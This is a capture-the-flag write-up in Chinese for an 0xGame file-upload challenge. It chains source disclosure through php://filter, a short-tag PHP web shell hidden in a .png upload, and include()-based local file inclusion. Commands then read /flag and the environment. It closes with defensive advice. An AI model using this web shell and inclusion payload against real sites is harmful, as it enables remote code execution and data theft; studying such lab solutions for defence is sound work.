# week2一个简单的上传

## 题目简述

应用同时存在受限文件上传和本地文件包含。上传端禁止扩展名或内容中出现 `ph`/`php`，但允许上传包含 PHP 短回显标签的图片后缀文件；`read.php` 随后用 `include()` 解析该文件，从而形成代码执行。

## 解题过程

首页注释泄露了读取接口：

```html
<!--read.php?filename=  -->
```

通过 `php://filter/read=convert.base64-encode/resource=read.php` 和同样方式读取 `index.php`，可以确认两处关键逻辑：

```php
// 上传端
$ext = pathinfo($file_name, PATHINFO_EXTENSION);
if (preg_match('/ph/i', strtolower($ext))) {
    die('blocked');
}
if (preg_match('/php/i', file_get_contents($temp_file))) {
    die('blocked');
}

// 读取端
include($_GET['filename']);
```

扩展名使用 `png`，文件内容使用不含字符串 `php` 的短标签：

```php
<?=eval($_POST[1]);?>
```

上传后，服务器会返回形如 `./uplo4d/<md5>.png` 的实际保存路径。将该路径传给包含接口：

```text
/read.php?filename=./uplo4d/<md5>.png
```

虽然扩展名是 `.png`，`include()` 仍会解析文件中的 PHP 标签。随后对同一 URL 发送 POST 表单，例如：

```text
1=system('cat /flag');system('env');
```

`/flag` 只提示真正的 flag 位于环境变量中，`env` 输出中可得到：

```text
0xGame{upl0ad_f1le_causes_danger!!!}
```

## 方法总结

利用链是“源码泄露 → 上传短标签代码到非 PHP 后缀 → 通过 `include()` 强制解析 → 从环境变量读取 flag”。单独限制扩展名或扫描关键字都不足以防御上传漏洞；上传目录应禁止脚本解析，文件名应由服务端生成，并且绝不能把用户可控路径交给 `include()`。
